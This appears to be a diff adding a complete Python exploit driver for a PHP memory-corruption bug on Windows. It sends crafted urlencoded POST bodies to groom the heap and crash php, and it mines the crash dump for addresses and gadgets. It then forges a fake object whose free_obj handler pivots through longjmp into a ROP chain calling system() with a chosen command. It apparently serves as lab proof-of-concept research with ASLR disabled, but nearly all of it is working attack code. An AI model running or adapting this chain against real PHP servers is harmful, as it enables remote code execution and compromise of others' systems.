@@ -1,0 +1,425 @@
+#!/usr/bin/env python3
+'''p2s win_rce.py — Windows x64 RCE chain driver (CVE-2026-109618 urlencoded OOM->UAF->free_obj->longjmp->system).
+
+Chain (port of the arm64/x86_64 Linux chain, Windows pivots):
+  OOM leaves the 64-slot HashTable half-built (bucket unwritten);
+  shutdown walks it, dtor dereferences zval.value at the unwritten bucket.
+  Feng-shui (same body as Linux, proven 8/8):
+    memshift=40000 M's + 30 a[<79984X><16dig>][c]=v fields + pad=<2528B> + pad=x + 30 more a-fields
+  probe pad:  bucket.value = 0xdead0001, type_info=0x106 (IS_STRING) -> AV at 0xdead0001
+              -> WER LocalDumps full .dmp -> parse -> PAD (marker hit - 1928), module bases.
+  rce pad:    bucket.value = fake object (IS_OBJECT 0x108); obj->handlers = PAD+2000;
+              handlers->free_obj = ucrtbase!longjmp; free_obj(obj) => RCX=obj=jmp_buf;
+              jmp_buf env[4]=rsp @ obj+32, env[5]=rip @ obj+40 -> pop rcx;ret -> system(cmd).
+  All constants measured in-run (ASLR off via Set-ProcessMitigation ForceRelocateImages disabled):
+    module bases from the dump, gadget/system/longjmp RVAs from the DLL files on disk.
+
+Receipts printed as P2S_* lines; result JSON in --out.
+Exit codes: 0=RCE receipt | 10 control fail | 11 probe did not crash | 12 no dump
+            13 marker not found in dump | 14 fire produced no marker file.
+'''
+import argparse, glob, json, mmap, os, socket, struct, subprocess, sys, time
+from datetime import datetime, timezone
+from urllib.parse import quote_from_bytes
+
+MARKER = p64 = lambda v: struct.pack('<Q', v)
+def p32(v): return struct.pack('<I', v)
+
+# ---------------------------------------------------------------- http ----
+def http_post(host, port, body, ctype, timeout=120, path='/index.php'):
+    hdr = (f'POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n'
+           f'Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n'
+           f'Connection: close\r\n\r\n').encode()
+    with socket.create_connection((host, port), timeout=timeout) as s:
+        s.settimeout(timeout)
+        s.sendall(hdr)
+        s.sendall(body)
+        chunks = []
+        try:
+            while True:
+                d = s.recv(65536)
+                if not d: break
+                chunks.append(d)
+        except (socket.timeout, OSError) as exc:
+            return {'error': f'read: {type(exc).__name__}: {exc}'}
+    raw = b''.join(chunks)
+    head, _, b = raw.partition(b'\r\n\r\n')
+    toks = head.split(b'\r\n')[0].split()
+    status = int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else None
+    return {'status': status, 'body': b[:2048], 'body_len': len(b)}
+
+def http_get(host, port, path='/index.php', timeout=20):
+    hdr = (f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n').encode()
+    with socket.create_connection((host, port), timeout=timeout) as s:
+        s.settimeout(timeout)
+        s.sendall(hdr)
+        chunks = []
+        try:
+            while True:
+                d = s.recv(65536)
+                if not d: break
+                chunks.append(d)
+        except (socket.timeout, OSError):
+            pass
+    raw = b''.join(chunks)
+    toks = raw.split(b'\r\n')[0].split()
+    return {'status': int(toks[1]) if len(toks) > 1 and toks[1].isdigit() else None,
+            'body': raw.partition(b'\r\n\r\n')[2][:512]}
+
+# ---------------------------------------------------------------- arm ----
+def key(i):
+    return b'X' * 79984 + b'%016d' % i
+
+def build_body(pad, memshift=40000):
+    out = b'memshift=' + b'M' * memshift + b'&'
+    for i in range(30):
+        out += b'a[' + key(i) + b'][c]=v&'
+    out += b'pad=' + quote_from_bytes(pad, safe='').encode() + b'&'
+    out += b'pad=x&'
+    for i in range(30, 60):
+        out += b'a[' + key(i) + b'][c]=v&'
+    return out[:-1]
+
+def build_probe_pad():
+    pad = bytearray(2528)
+    pad[1928:1936] = p64(0xdead0001)
+    pad[1936:1940] = p32(0x106)                 # IS_STRING
+    return bytes(pad)
+
+def build_rce_pad(PAD, LONGJMP, SYSTEM, POPRCX, cmd):
+    pad = bytearray(2528)
+    fo = PAD + 2056
+    pad[1928:1936] = p64(fo)                     # unwritten bucket zval.value
+    pad[1936:1940] = p32(0x108)                  # IS_OBJECT | GC_NOT_COLLECTABLE
+    pad[1940:1944] = p32(0)
+    pad[2056:2060] = p32(1)                      # gc.refcount
+    pad[2060:2064] = p32(0x108)                  # gc.type_info
+    pad[2064:2068] = p32(0)                      # handle
+    pad[2072:2080] = p64(0)                      # ce
+    pad[2080:2088] = p64(PAD + 2000)             # handlers
+    pad[2008:2016] = p64(LONGJMP)                # handlers->free_obj (handlers+8)
+    pad[2088:2096] = p64(PAD + 2352)             # jmp_buf rsp @ fo+32
+    pad[2096:2104] = p64(POPRCX)                # jmp_buf rip @ fo+40
+    pad[2352:2360] = p64(PAD + 2400)             # fake stack: popped -> rcx = &cmd
+    pad[2360:2368] = p64(SYSTEM)                 # ret -> system(rcx)
+    pad[2368:2376] = p64(0)                       # system returns -> crash (receipt already on disk)
+    c = cmd if isinstance(cmd, bytes) else cmd.encode()
+    pad[2400:2400 + len(c) + 1] = c + b'\x00'
+    return bytes(pad)
+
+# ---------------------------------------------------------------- PE ----
+def pe_sections(data):
+    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
+    nsec = struct.unpack_from('<H', data, e_lfanew + 6)[0]
+    opt_size = struct.unpack_from('<H', data, e_lfanew + 20)[0]
+    sec0 = e_lfanew + 24 + opt_size
+    out = []
+    for i in range(nsec):
+        o = sec0 + i * 40
+        name = data[o:o + 8].rstrip(b'\x00').decode('latin-1')
+        vsize, va, rsize, roff = struct.unpack_from('<IIII', data, o + 8)
+        out.append({'name': name, 'va': va, 'vsize': vsize, 'raw': roff, 'rsize': rsize})
+    return out
+
+def rva_to_off(sections, rva):
+    for s in sections:
+        if s['va'] <= rva < s['va'] + max(s['vsize'], s['rsize']):
+            d = rva - s['va']
+            if d < s['rsize']:
+                return s['raw'] + d
+    return None
+
+def pe_exports(data, wanted):
+    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
+    opt = e_lfanew + 24
+    magic = struct.unpack_from('<H', data, opt)[0]
+    dd = opt + (0x70 if magic == 0x20b else 0x60)         # PE32+ vs PE32 data dir offset
+    exp_rva, exp_size = struct.unpack_from('<II', data, dd)
+    sections = pe_sections(data)
+    eo = rva_to_off(sections, exp_rva)
+    if eo is None:
+        return {}
+    nfun, nnames, addrfun, addrnames, addroords = struct.unpack_from('<IIIII', data, eo + 20)
+    out = {}
+    for i in range(nnames):
+        nrva = struct.unpack_from('<I', data, rva_to_off(sections, addrnames) + 4 * i)[0]
+        no = rva_to_off(sections, nrva)
+        name = data[no:data.index(b'\x00', no)].decode('latin-1')
+        if name in wanted:
+            ordn = struct.unpack_from('<H', data, rva_to_off(sections, addroords) + 2 * i)[0]
+            frva = struct.unpack_from('<I', data, rva_to_off(sections, addrfun) + 4 * ordn)[0]
+            out[name] = frva
+    return out
+
+def find_pop_rcx_ret(path):
+    with open(path, 'rb') as f:
+        data = f.read()
+    sections = pe_sections(data)
+    text = next(s for s in sections if s['name'] == '.text')
+    blob = data[text['raw']:text['raw'] + text['rsize']]
+    hits = []
+    start = 0
+    while True:
+        i = blob.find(b'\x59\xc3', start)
+        if i < 0:
+            break
+        hits.append(text['va'] + i)
+        start = i + 1
+    return hits
+
+# ---------------------------------------------------------------- minidump ----
+def parse_minidump(path, marker=b'\x01\x00\xad\xde\x06\x01\x00\x00', marker_pad_off=1928):
+    f = open(path, 'rb')
+    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+    if mm[:4] != b'MDMP':
+        raise ValueError('not a minidump')
+    nstreams = struct.unpack_from('<I', mm, 12)[0]
+    dirrva = struct.unpack_from('<I', mm, 16)[0]
+    modules, exc, ranges = [], None, []
+    for i in range(nstreams):
+        st, ds, rva = struct.unpack_from('<III', mm, dirrva + i * 12)
+        if st == 4:                                     # ModuleListStream
+            n = struct.unpack_from('<I', mm, rva)[0]
+            for j in range(n):
+                o = rva + 4 + j * 108
+                base, size = struct.unpack_from('<QI', mm, o)[0:2]
+                name_rva = struct.unpack_from('<I', mm, o + 20)[0]
+                ln = struct.unpack_from('<I', mm, name_rva)[0]
+                name = mm[name_rva + 4:name_rva + 4 + ln].decode('utf-16-le')
+                modules.append({'base': base, 'size': size, 'name': name})
+        elif st == 6:                                   # ExceptionStream
+            tid = struct.unpack_from('<I', mm, rva)[0]
+            code, flags, rec, addr, nparams = struct.unpack_from('<IIQQI', mm, rva + 8)[:5]
+            params = [struct.unpack_from('<Q', mm, rva + 8 + 40 + 8 * k)[0] for k in range(min(nparams, 4))]
+            # MINIDUMP_EXCEPTION = 152 bytes; ThreadContext location descriptor follows
+            cdsz, cdrva = struct.unpack_from('<II', mm, rva + 8 + 152)
+            rip = struct.unpack_from('<Q', mm, cdrva + 0xF8)[0]
+            rsp = struct.unpack_from('<Q', mm, cdrva + 0x98)[0]
+            rcx = struct.unpack_from('<Q', mm, cdrva + 0x80)[0]
+            exc = {'code': code, 'addr': addr, 'params': params, 'rip': rip, 'rsp': rsp, 'rcx': rcx, 'tid': tid}
+        elif st == 9:                                   # Memory64ListStream
+            nranges, base_rva = struct.unpack_from('<QQ', mm, rva)
+            off = base_rva
+            for j in range(nranges):
+                s, sz = struct.unpack_from('<QQ', mm, rva + 16 + j * 16)
+                ranges.append({'start': s, 'size': sz, 'file_off': off})
+                off += sz
+    hits = []
+    for r in ranges:
+        if r['size'] < marker_pad_off + len(marker):
+            continue
+        i = mm.find(marker, r['file_off'], r['file_off'] + r['size'])
+        while i >= 0:
+            if i - r['file_off'] >= marker_pad_off:
+                hits.append(r['start'] + (i - r['file_off']) - marker_pad_off)
+            i = mm.find(marker, i + 1, r['file_off'] + r['size'])
+    mm.close()
+    f.close()
+    return {'modules': modules, 'exc': exc, 'pad_hits': hits}
+
+# ---------------------------------------------------------------- php server ----
+def wait_port(host, port, proc, timeout=25):
+    t0 = time.time()
+    while time.time() - t0 < timeout:
+        if proc.poll() is not None:
+            return False
+        try:
+            with socket.create_connection((host, port), timeout=2):
+                return True
+        except OSError:
+            time.sleep(0.4)
+    return False
+
+def start_php(php_exe, host, port, docroot, ini, log):
+    lf = open(log, 'ab')
+    p = subprocess.Popen([php_exe, '-S', f'{host}:{port}', '-t', docroot, '-c', ini],
+                         stdout=lf, stderr=lf)
+    return p
+
+def wait_dump(dumpdir, deadline_s=150):
+    t0 = time.time()
+    seen = set()
+    while time.time() - t0 < deadline_s:
+        for d in glob.glob(os.path.join(dumpdir, '*.dmp')):
+            if d not in seen and os.path.getsize(d) > 100000:
+                # let WER finish writing (size stable across 2 samples)
+                s1 = os.path.getsize(d)
+                time.sleep(3)
+                if os.path.getsize(d) == s1:
+                    return d
+        time.sleep(2)
+    return None
+
+# ---------------------------------------------------------------- main ----
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument('--php-dir', required=True)
+    ap.add_argument('--version', required=True)
+    ap.add_argument('--host', default='127.0.0.1')
+    ap.add_argument('--port', type=int, default=8080)
+    ap.add_argument('--dump-dir', required=True)
+    ap.add_argument('--ucrt', default='C:\\Windows\\System32\\ucrtbase.dll')
+    ap.add_argument('--marker', required=True, help='absolute path of the RCE receipt file')
+    ap.add_argument('--cmd', default=None)
+    ap.add_argument('--out', default='win_rce_result.json')
+    a = ap.parse_args()
+
+    php_exe = os.path.join(a.php_dir, 'php.exe')
+    stage = os.path.dirname(a.marker)
+    os.makedirs(stage, exist_ok=True)
+    os.makedirs(a.dump_dir, exist_ok=True)
+    docroot = os.path.join(stage, 'docroot')
+    os.makedirs(docroot, exist_ok=True)
+    with open(os.path.join(docroot, 'index.php'), 'w') as f:
+        f.write("<?php echo 'P2S-OK ' . PHP_VERSION . ' ' . php_uname('s');")
+    ini = os.path.join(a.php_dir, 'php_p2s.ini')
+    with open(ini, 'w') as f:
+        f.write('memory_limit=8M\npost_max_size=1G\ndisplay_errors=On\n'
+                f'display_startup_errors=On\nerror_log={stage}\\php_err.log\n')
+    if os.path.exists(a.marker):
+        os.remove(a.marker)
+
+    res = {'version': a.version, 'stage': stage, 'ts': datetime.now(timezone.utc).isoformat()}
+
+    # ---- stage 1: control --------------------------------------------------
+    log = os.path.join(stage, 'php_server.log')
+    p1 = start_php(php_exe, a.host, a.port, docroot, ini, log)
+    if not wait_port(a.host, a.port, p1):
+        print('P2S_STAGE_CONTROL=FAIL (server did not come up)')
+        tail = open(log, 'rb').read()[-2000:].decode('latin-1', 'replace') if os.path.exists(log) else ''
+        print(tail)
+        json.dump(res, open(a.out, 'w'))
+        return 10
+    ctl = http_get(a.host, a.port)
+    print(f"P2S_STAGE_CONTROL status={ctl['status']} body={ctl['body'][:80]!r}")
+    res['control'] = ctl
+    if ctl['status'] != 200:
+        p1.kill()
+        json.dump(res, open(a.out, 'w'))
+        return 10
+
+    # ---- stage 2: probe fire -> crash -> dump ------------------------------
+    body = build_body(build_probe_pad())
+    print(f'P2S_STAGE_PROBE fire body={len(body)}B')
+    pr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
+    print(f'P2S_STAGE_PROBE resp={pr.get("status")} err={pr.get("error")} body_len={pr.get("body_len")}')
+    res['probe_resp'] = {k: v for k, v in pr.items() if k != 'body'}
+    rc = p1.poll()
+    t0 = time.time()
+    while p1.poll() is None and time.time() - t0 < 20:
+        time.sleep(0.5)
+    rc = p1.poll()
+    print(f'P2S_STAGE_PROBE php_exit={rc}')
+    res['probe_php_exit'] = rc
+    if rc is None:
+        p1.kill()
+        print('P2S_STAGE_PROBE=FAIL (php did not die)')
+        json.dump(res, open(a.out, 'w'))
+        return 11
+    dump = wait_dump(a.dump_dir)
+    if not dump:
+        print('P2S_STAGE_MEASURE=FAIL (no WER dump)')
+        json.dump(res, open(a.out, 'w'))
+        return 12
+    print(f'P2S_STAGE_MEASURE dump={dump} size={os.path.getsize(dump)}')
+
+    # ---- stage 3: dump parse -> constants ----------------------------------
+    md = parse_minidump(dump)
+    if not md['pad_hits']:
+        print('P2S_STAGE_MEASURE=FAIL (marker not found in dump)')
+        res['exc'] = md['exc']
+        json.dump(res, open(a.out, 'w'))
+        return 13
+    PAD = md['pad_hits'][0]
+    phpdll = [m for m in md['modules'] if m['name'].lower().endswith(('php7.dll', 'php8.dll'))]
+    ucrt = [m for m in md['modules'] if m['name'].lower().endswith('ucrtbase.dll')]
+    if not phpdll or not ucrt:
+        print('P2S_STAGE_MEASURE=FAIL (php dll or ucrtbase not in module list)')
+        res['modules'] = md['modules']
+        json.dump(res, open(a.out, 'w'))
+        return 13
+    php_dll_base, php_dll_name = phpdll[0]['base'], os.path.basename(phpdll[0]['name'])
+    ucrt_base = ucrt[0]['base']
+    php_dll_file = os.path.join(a.php_dir, php_dll_name)
+    ucrt_file = a.ucrt
+    if not os.path.exists(ucrt_file):
+        # fallback: the runner's system32 copy
+        ucrt_file = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'ucrtbase.dll')
+    ex = md['exc'] or {}
+    print('P2S_STAGE_MEASURE exc_code=%#x exc_addr=%#x p1=%#x rip=%#x rsp=%#x' % (
+        ex.get('code', 0), ex.get('addr', 0), (ex.get('params') or [0, 0])[0] if ex.get('params') else 0,
+        ex.get('rip', 0), ex.get('rsp', 0)))
+    hits = find_pop_rcx_ret(php_dll_file)
+    if not hits:
+        print('P2S_STAGE_MEASURE=FAIL (no pop rcx;ret in php dll)')
+        json.dump(res, open(a.out, 'w'))
+        return 13
+    poprcx_rva = hits[len(hits) // 2]
+    with open(ucrt_file, 'rb') as f:
+        udata = f.read()
+    exps = pe_exports(udata, {'system', 'longjmp'})
+    if 'system' not in exps or 'longjmp' not in exps:
+        print('P2S_STAGE_MEASURE=FAIL (ucrtbase exports: %s)' % list(exps))
+        json.dump(res, open(a.out, 'w'))
+        return 13
+    consts = {
+        'PAD': PAD,
+        'php_dll': php_dll_name, 'php_dll_base': php_dll_base,
+        'ucrt_base': ucrt_base,
+        'poprcx_ret': php_dll_base + poprcx_rva, 'poprcx_rva': poprcx_rva,
+        'system': ucrt_base + exps['system'], 'system_rva': exps['system'],
+        'longjmp': ucrt_base + exps['longjmp'], 'longjmp_rva': exps['longjmp'],
+        'PAD_mod16': PAD % 16,
+    }
+    res['consts'] = consts
+    res['exc'] = ex
+    print('P2S_CONSTS ' + json.dumps({k: (hex(v) if isinstance(v, int) else v) for k, v in consts.items()}))
+    json.dump(res, open(a.out, 'w'))
+
+    # ---- stage 4: restart (same boot, ASLR off -> same bases) --------------
+    p1.kill()
+    for port_backoff in range(4):
+        p2 = start_php(php_exe, a.host, a.port, docroot, ini, log)
+        if wait_port(a.host, a.port, p2):
+            break
+        p2.kill()
+        time.sleep(2)
+    else:
+        print('P2S_STAGE_FIRE=FAIL (restart failed)')
+        return 11
+    ctl2 = http_get(a.host, a.port)
+    print(f'P2S_STAGE_FIRE control2 status={ctl2["status"]} body={ctl2["body"][:80]!r}')
+
+    # ---- stage 5: fire RCE --------------------------------------------------
+    cmd = a.cmd or f'cmd /c whoami > "{a.marker}" 2>&1'
+    if len(cmd) > 110:
+        print('P2S_STAGE_FIRE=FAIL (cmd too long)')
+        p2.kill()
+        return 14
+    pad = build_rce_pad(consts['PAD'], consts['longjmp'], consts['system'], consts['poprcx_ret'], cmd)
+    body = build_body(pad)
+    print(f'P2S_STAGE_FIRE body={len(body)}B cmd={cmd!r}')
+    fr = http_post(a.host, a.port, body, 'application/x-www-form-urlencoded')
+    print(f'P2S_STAGE_FIRE resp={fr.get("status")} err={fr.get("error")} body_len={fr.get("body_len")}')
+    res['fire_resp'] = {k: v for k, v in fr.items() if k != 'body'}
+    # ROP runs inside php_request_shutdown; give system() time to finish
+    t0 = time.time()
+    while time.time() - t0 < 30 and not os.path.exists(a.marker):
+        time.sleep(1)
+    if os.path.exists(a.marker):
+        content = open(a.marker, 'rb').read()[:500].decode('latin-1', 'replace')
+        print('P2S_RCE=PASS marker=' + repr(content))
+        res['rce'] = 'PASS'
+        res['marker_content'] = content
+        p2.kill()
+        json.dump(res, open(a.out, 'w'))
+        return 0
+    # fire crash dump (if any) is also evidence
+    rc = p2.poll()
+    print(f'P2S_STAGE_FIRE php_exit={rc} marker=MISSING')
+    res['rce'] = 'FAIL'
+    json.dump(res, open(a.out, 'w'))
+    return 14
+
+if __name__ == '__main__':
+    sys.exit(main())
